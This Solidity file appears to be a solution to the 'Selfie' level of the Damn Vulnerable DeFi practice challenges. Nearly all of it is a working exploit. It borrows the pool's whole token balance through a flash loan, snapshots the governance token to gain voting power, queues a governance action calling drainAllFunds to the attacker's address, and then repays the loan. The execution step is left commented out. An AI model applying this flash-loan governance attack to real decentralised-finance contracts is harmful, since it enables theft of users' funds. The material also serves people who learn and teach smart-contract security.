pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../../contracts/selfie/SelfiePool.sol";
import "../../contracts/selfie/SimpleGovernance.sol";


// 1) make flash loan so we have enough tokens to run governer
// 2) queue & execute execution
contract SelfieEnqueueAttackAction {
  
    using Address for address;   

    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public govern;
    address private attacker;
    uint256 public actionID;
    bool firstEntrance;

    constructor(address tokenAddress,
                address poolAddress, 
                address governAddress) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        govern = SimpleGovernance(governAddress);
        attacker = msg.sender;
        firstEntrance = false;
    }

    function flashLoanAndEnqueue() public {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }
    

    function receiveTokens(address tokenAddress,
                           uint256 amount) external {
        // with the money we can queue actions
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)",
                                                    address(attacker)); 
        token.snapshot();
        actionID = govern.queueAction(address(pool), 
                                      data, 
                                      0);
        // govern.executeAction(actionID);
        
        // return all
        token.transfer(address(pool), amount);
    }

}

